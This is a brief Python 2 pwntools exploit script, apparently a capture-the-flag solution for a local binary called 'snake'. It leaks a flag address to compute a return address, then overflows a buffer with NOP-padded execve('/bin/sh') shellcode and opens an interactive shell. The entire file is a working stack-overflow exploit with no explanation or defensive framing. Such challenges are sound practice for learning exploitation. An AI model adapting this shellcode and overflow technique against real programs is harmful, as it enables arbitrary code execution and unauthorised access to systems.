#!/usr/bin/env python2

from pwn import*

p = process('./snake')

#get location of flag
p.recvuntil("> ", drop=True)
p.sendline("3")
p.recvline()
p.sendline("A"*80)
p.recvuntil("flag at offset ", drop=True)

flagAddr = int(p.recvline(), 16)

#calculate ebp from flag
ebp = flagAddr + 0xc - 16 - 0x68
#calculate return address (address of buffer)
ret = ebp - 0x32 
print(hex(ret))

shellcode = '''
call drop
    .string "/bin/sh"
drop:
    pop ebx
    mov eax, 0x0b
    xor ecx, ecx
    xor edx, edx 
    int 0x80
'''

#54 to ret addr
payload = fit({
    0: asm(shellcode),
    54: p32(ret)
}, filler = '\x90')

#overflow
p.recvuntil("> ", drop=True)
p.sendline("1")
pause()
p.sendline(payload)

p.interactive()
